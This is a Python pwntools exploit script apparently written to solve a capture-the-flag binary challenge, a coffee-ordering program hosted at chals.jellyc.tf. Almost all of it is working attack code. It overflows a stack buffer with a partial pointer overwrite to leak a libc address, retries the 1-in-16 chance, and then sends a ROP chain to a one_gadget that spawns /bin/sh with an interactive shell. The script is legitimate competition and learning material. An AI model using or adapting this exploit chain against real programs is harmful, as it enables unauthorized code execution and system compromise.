#!/usr/bin/env python3

from pwn import *
import sys
from textwrap import dedent

context.terminal = 'kitty'
context.binary = ELF('./main')
# note: docker image is just "ubuntu"
libc = ELF('./libc.so.6')

REMOTE = len(sys.argv) > 1 and sys.argv[1].lower().startswith('r')

def get_io():
    if REMOTE:
        io = remote('chals.jellyc.tf', 5002)
    else:
        io = process(context.binary.path)
        
    return io

def attach_gdb(io, extra=''):
    if not REMOTE:
        gdb.attach(io, dedent(
        f'''
        {extra}
        c
        '''))

def solve(io):
    # challenge calls fflush on stdin and not stdout so there's annoying buffering
    # io.recvuntil(b'Enter a menu selection \n')
    io.sendline(b'2')
    # io.recvuntil(b'Please make a selection: ')
    io.sendline(b'1')
    # io.recvuntil(b'Enter desired quantity: ')
    io.sendline(b'1')
    # io.recvuntil(b'Please enter your shipping address: ')
    # offsets:
    # buf = 0x7ffd2dd9ad70 = rbp - 0xe0
    # rbp = 0x7ffd2dd9ae50
    # balance = rbp - 0x14, gets overriden by rbp - 0x40
    #                              vv balance
    io.sendline(cyclic(0xa0) + p32(0x39393939) + b'A' * 0xb)   # overwrite last byte of the ptr to shipping address to be 0
    io.recvuntil(b'Coffee will be delivered to ')
    s = io.recvuntil(b'\nCurrent balance:', drop=True)
    leak = u64(s.ljust(8, b'\x00')[:8])
    print('attempted leak:', hex(leak), s)
    # observed leaks:
    # 1. main+0x2148
    # 2. libc+0x2038e0
    # 3. various stack addresses
    # 4. garbage (contents of buf, small constants)
    # retry for the libc leak (seems to be 1/16)
    if (leak & ~0xff) == 0 or (leak >> 48) != 0 or leak >= 0x7ff000000000 or leak < 0x7f0000000000:
        return False
    libc.address = leak - 0x2038e0
    print('libc:', hex(libc.address))
    # attach_gdb(io, f'xinfo {hex(leak)}')

    # if we win the 1/16 then the last byte of the stack is fixed now
    # orig start of buf = 0x7ffd1b76a260
    # new start of buf  = 0x7ffd1b76a200
    # rbp               = 0x7ffd1b76a340

    # use this one_gadget:
    # 0x583dc posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
    # constraints:
    # address rsp+0x68 is writable
    # rsp & 0xf == 0
    # rax == NULL || {"sh", rax, rip+0x17302e, r12, ...} is a valid argv
    # rbx == NULL || (u16)[rbx] == NULL || {"sh", rax, rip+0x17302e, r12, ...} is a valid envp
    rop = ROP(libc, badchars=b'\n')
    try:
        rop(rax=0, rbx=0)
    except PwnlibException:
        print('rop (reg) has newline')
        return False
    rop.raw(libc.address + 0x583dc)
    payload = rop.chain()
    if b'\n' in payload:
        print('rop (one_gadget addr) has newline')
        return False
    print(rop.dump())
    io.sendline(b'2')
    io.sendline(b'1')
    io.sendline(b'1')
    io.sendline(b'A' * 0x28 + payload)  # payload gets written earlier on the stack than before so it overwrites ~fgets return (or similar)
    io.interactive()
    return True

while True:
    io = get_io()
    done = solve(io)
    io.close()
    if done:
        break
